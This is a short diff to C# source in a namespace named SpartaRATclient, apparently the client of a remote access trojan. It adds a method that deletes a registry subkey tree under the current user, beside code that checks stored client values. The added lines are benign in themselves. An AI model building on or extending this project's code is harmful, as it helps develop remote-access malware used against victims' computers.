@@ -13,6 +13,12 @@ namespace SpartaRATclient
     {
         public string OpenedDate;
         public string OSVersion;
+
+        public void DeleteSubKeyTree(string value)
+        {
+            Registry.CurrentUser.DeleteSubKeyTree(value, false);
+        }
+
         public bool CheckIfRegistryDataExist(string value)
         {
             string RegistryPath = @"HKEY_CURRENT_USER\Software\ClientValues";
